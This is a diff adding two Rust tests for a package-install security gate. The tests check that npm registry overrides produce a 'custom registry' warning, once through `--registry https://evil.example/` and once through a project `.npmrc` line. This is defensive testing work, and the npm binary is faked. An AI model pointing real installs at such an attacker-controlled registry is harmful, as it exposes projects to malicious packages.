@@ -148,6 +148,56 @@ fn npm_ci_root_redirect_refuses_without_force() {
 }
 
 #[test]
+fn npm_ci_registry_flag_warns_then_proceeds() {
+    // `npm ci --registry <url>` pulls tarballs from the override while the
+    // gate verdicts the lockfile against the default registry — warn, but
+    // still proceed on a clean lockfile.
+    let mut h = GateHarness::new()
+        .fake_recorder("npm", 0)
+        .vuln_checks(HashMap::new())
+        .with_project_file("package.json", PACKAGE_JSON)
+        .with_project_file("package-lock.json", NPM_LOCK)
+        .build();
+    let out = h
+        .cmd
+        .args(["npm", "ci", "--registry", "https://evil.example/"])
+        .output()
+        .expect("run corgea");
+    assert_eq!(out.status.code(), Some(0), "clean lockfile must proceed");
+    assert_eq!(
+        h.recorded_argv().as_deref(),
+        Some("ci --registry https://evil.example/")
+    );
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("--registry") && stderr.contains("custom registry"),
+        "npm ci --registry must warn: {stderr}"
+    );
+}
+
+#[test]
+fn npm_ci_npmrc_registry_warns_then_proceeds() {
+    // A project `.npmrc` `registry=` line silently redirects resolution; the
+    // gate copies it into its temp dir so resolution honours the override, yet
+    // verdicts against the default registry — warn on it.
+    let mut h = GateHarness::new()
+        .fake_recorder("npm", 0)
+        .vuln_checks(HashMap::new())
+        .with_project_file("package.json", PACKAGE_JSON)
+        .with_project_file("package-lock.json", NPM_LOCK)
+        .with_project_file(".npmrc", "registry=https://evil.example/\n")
+        .build();
+    let out = h.cmd.args(["npm", "ci"]).output().expect("run corgea");
+    assert_eq!(out.status.code(), Some(0), "clean lockfile must proceed");
+    assert_eq!(h.recorded_argv().as_deref(), Some("ci"));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains(".npmrc") && stderr.contains("custom registry"),
+        "project .npmrc registry override must warn: {stderr}"
+    );
+}
+
+#[test]
 fn npm_ci_without_lockfile_execs() {
     // npm ci errors on its own without a lockfile; nothing to gate.
     let mut h = GateHarness::new()
